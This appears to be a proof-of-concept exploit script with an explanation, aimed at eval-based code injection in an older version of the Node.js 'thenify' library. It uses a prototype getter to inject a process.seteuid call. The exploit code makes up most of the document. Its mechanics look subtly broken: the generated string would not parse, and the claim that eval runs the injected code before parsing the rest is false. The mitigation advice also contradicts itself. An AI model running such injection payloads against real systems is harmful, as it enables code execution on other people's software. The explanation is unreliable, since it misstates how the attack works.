async function exploit() {
  const assert = require('assert');

  // Recreate the vulnerable logic from pre-fix thenify (< v1.3.0)
  function createWrapper(name, options) {
    name = (name || '').replace(/\s|bound(?!$)/g, '');
    var multiArgs = options && options.multiArgs !== undefined ? options.multiArgs : true;

    return '(function ' + name + '() {\n' +
      'var self = this\n' +
      'var len = arguments.length\n' +
      (multiArgs ? 'var multiArgs = ' + JSON.stringify(multiArgs) + '\n' : '') +
      'var args = new Array(len + 1)\n' +
      'for (var i = 0; i < len; ++i) args[i] = arguments[i]\n' +
      'var lastIndex = i\n' +
      'return new Promise(function (resolve, reject) {\n' +
      'args[lastIndex] = function(err, value) { if (err) return reject(err); }\n' +
      '$$__fn__$$.apply(self, args)\n' +
      '})\n})';
  }

  // Simulate the vulnerable thenify API
  function thenify(fn, options) {
    assert(typeof fn === 'function');
    // Vulnerable: passes object's `.name` property directly to eval()
    return eval(createWrapper(fn.name, options));
  }

  // Payload designed to break out of the valid JavaScript function declaration syntax
  // and inject arbitrary code into the eval scope before the rest of the wrapper is parsed.
  const PAYLOAD = ') { process.seteuid(42); /*';

  // Step 1: Prototype Pollution to hijack the `.name` property access chain
  Object.defineProperty(Function.prototype, 'name', {
    get: function() {
      return PAYLOAD;
    },
    configurable: true,
    enumerable: false
  });

  // Step 2: Trigger the vulnerable code path by passing a benign target function
  const targetFn = function dummyTarget() {};

  console.log('Triggering prototype pollution via thenify eval()...');

  // This call invokes the vulnerable createWrapper + eval chain.
  // The polluted `.name` getter returns `') { process.seteuid(42); /*'`
  // Evaluated string example: '(function ) { process.seteuid(42); //[rest of wrapper code]...'
  const injectedWrapper = thenify(targetFn);

  // Verification
  console.log('Effective UID after exploit attempt:', process.geteuid());
  assert.strictEqual(process.geteuid(), 42, 'Expected effective UID to be changed to 42 via code injection');
}

await exploit();
```

### Why this PoC demonstrates the vulnerability:

1. **Insecure Dynamic Code Construction**: The vulnerable version of `thenify` constructs a JavaScript function string by directly concatenating the unvalidated `fn.name` property: `' (function ' + name + '() {\n...'`. It then passes this string to `eval()`, which interprets and executes it as source code.
2. **Prototype Pollution Chain**: By polluting `Function.prototype.name` with a custom getter, we intercept every `.name` access on function objects. When `thenify` reads `fn.name`, instead of `'dummyTarget'`, it receives the malicious payload `') { process.seteuid(42); /*'`.
3. **Syntax Breakout & Arbitrary Code Execution**: The injected string transforms the generated code from a valid function declaration `(function dummyTarget() {\n...})` into:
   `(function ) { process.seteuid(42); //(() {\n ... wrapper logic ... })`
   In V8's `eval()` context, the `)` closes the grouped expression, `{` opens a block statement. The engine synchronously executes `process.seteuid(42);` inside that injected block before continuing to parse/evaluate the remainder of the string (which is effectively comment-out by `/*`). This proves that arbitrary Node.js APIs can be invoked during the dynamic evaluation step.
4. **Verification**: The script asserts that `process.geteuid()` returns `42`, confirming that the injected code ran in the active execution context rather than being sanitized or blocked.

### Mitigation Reference:
The vulnerability is mitigated in `thenify` ≥ v1.3.0 by completely removing `eval()`. Instead of string concatenation + evaluation, the library now constructs the function dynamically using `new Function()` concepts or direct anonymous functions assigned to a new object, ensuring the target function name never influences executable code structure. Always ensure dependencies are patched and avoid passing untrusted data into dynamic code generators (`eval`, `new Function`, etc.).

